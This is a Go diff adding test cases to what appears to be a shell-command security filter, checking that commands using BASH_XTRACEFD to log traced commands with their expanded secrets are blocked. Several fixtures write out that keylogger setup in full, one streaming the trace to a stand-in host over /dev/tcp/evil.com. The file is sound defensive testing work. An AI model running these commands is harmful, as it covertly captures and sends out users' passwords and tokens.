@@ -2541,6 +2541,138 @@ var TTYRecordingCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// BASH_XTRACEFD — Shell Trace Redirect (Command Keylogger)
+// ---------------------------------------------------------------------------
+//
+// Taxonomy: credential-exposure/shell-abuse/xtrace-redirect-keylogger
+//
+// BASH_XTRACEFD redirects xtrace output (set -x) to an arbitrary file
+// descriptor. Combined with exec FD>/path, this captures every command
+// with fully-expanded variable values (passwords, API keys, tokens).
+//
+// Rules: ts-block-bash-xtracefd-redirect, ts-block-xtrace-exec-redirect,
+//        ts-block-xtrace-fd-then-exec
+
+var XtraceRedirectKeyloggerCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	// TP-1: BASH_XTRACEFD export (direct)
+	{
+		ID:               "TP-TS-BLOCK-XTRACEFD-001",
+		Command:          `export BASH_XTRACEFD=19`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "Exporting BASH_XTRACEFD redirects xtrace to fd 19 — with set -x, captures every command with expanded secrets.",
+		Tags:             []string{"tp", "xtracefd", "keylogger"},
+	},
+	// TP-2: BASH_XTRACEFD assignment (without export)
+	{
+		ID:               "TP-TS-BLOCK-XTRACEFD-002",
+		Command:          `BASH_XTRACEFD=5`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "BASH_XTRACEFD assignment without export — still redirects xtrace in current shell.",
+		Tags:             []string{"tp", "xtracefd", "keylogger"},
+	},
+	// TP-3: exec redirect + BASH_XTRACEFD combo (file staging)
+	{
+		ID:               "TP-TS-BLOCK-XTRACEFD-003",
+		Command:          `exec 19>/tmp/.trace; BASH_XTRACEFD=19; set -x`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "Full keylogger setup: fd opened to /tmp, xtrace redirected, tracing enabled — logs all commands with expanded values.",
+		Tags:             []string{"tp", "xtracefd", "keylogger"},
+	},
+	// TP-4: exec redirect to /dev/shm + BASH_XTRACEFD
+	{
+		ID:               "TP-TS-BLOCK-XTRACEFD-004",
+		Command:          `exec 7>/dev/shm/.xtrace_log; BASH_XTRACEFD=7`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "Xtrace to /dev/shm — RAM-only keylogger, no disk forensic trace.",
+		Tags:             []string{"tp", "xtracefd", "keylogger"},
+	},
+	// TP-5: exec redirect to /dev/tcp (real-time network stream)
+	{
+		ID:               "TP-TS-BLOCK-XTRACEFD-005",
+		Command:          `exec 9>/dev/tcp/evil.com/443; BASH_XTRACEFD=9; set -x`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "Xtrace to /dev/tcp — streams all command traces with expanded secrets to attacker in real time.",
+		Tags:             []string{"tp", "xtracefd", "keylogger"},
+	},
+	// TP-6: reverse order — BASH_XTRACEFD first, then exec
+	{
+		ID:               "TP-TS-BLOCK-XTRACEFD-006",
+		Command:          `BASH_XTRACEFD=3; exec 3>/tmp/.keylog`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "Reverse order setup: BASH_XTRACEFD set first then fd opened — same keylogger result.",
+		Tags:             []string{"tp", "xtracefd", "keylogger"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	// TN-1: set -x without BASH_XTRACEFD (normal debugging to stderr)
+	{
+		ID:               "TN-TS-BLOCK-XTRACEFD-001",
+		Command:          `set -x`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "set -x without BASH_XTRACEFD — traces to stderr (visible to user), standard debugging. Gets AUDIT from sec-audit-env-dump but NOT BLOCK.",
+		Tags:             []string{"tn", "safe", "xtracefd"},
+	},
+	// TN-2: set +x (disable xtrace)
+	{
+		ID:               "TN-TS-BLOCK-XTRACEFD-002",
+		Command:          `set +x`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "set +x disables xtrace — turning off tracing, defensive action. Gets AUDIT from sec-audit-env-dump but NOT BLOCK.",
+		Tags:             []string{"tn", "safe", "xtracefd"},
+	},
+	// TN-3: PS4 customization (xtrace prompt format — cosmetic)
+	{
+		ID:               "TN-TS-BLOCK-XTRACEFD-003",
+		Command:          `PS4='+ ${BASH_SOURCE}:${LINENO}: '`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "PS4 customization — changes xtrace prompt format, not trace destination. Gets default AUDIT but NOT BLOCK.",
+		Tags:             []string{"tn", "safe", "xtracefd"},
+	},
+	// TN-4: exec redirect without BASH_XTRACEFD (normal file redirect)
+	{
+		ID:               "TN-TS-BLOCK-XTRACEFD-004",
+		Command:          `exec 3>/tmp/output.log`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "credential-exposure/shell-abuse/xtrace-redirect-keylogger",
+		Analyzer:         "regex",
+		Description:      "exec fd redirect without BASH_XTRACEFD — normal output redirection. Gets default AUDIT but NOT BLOCK from XTRACEFD rules.",
+		Tags:             []string{"tn", "safe", "xtracefd"},
+	},
+}
+
 // AllCredentialExposureCases returns all test cases for Kingdom 2.
 func AllCredentialExposureCases() []TestCase {
 	var all []TestCase
@@ -2563,5 +2695,6 @@ func AllCredentialExposureCases() []TestCase {
 	all = append(all, TerraformStateCredentialCases...)
 	all = append(all, BrowserCredentialTheftCases...)
 	all = append(all, TTYRecordingCases...)
+	all = append(all, XtraceRedirectKeyloggerCases...)
 	return all
 }
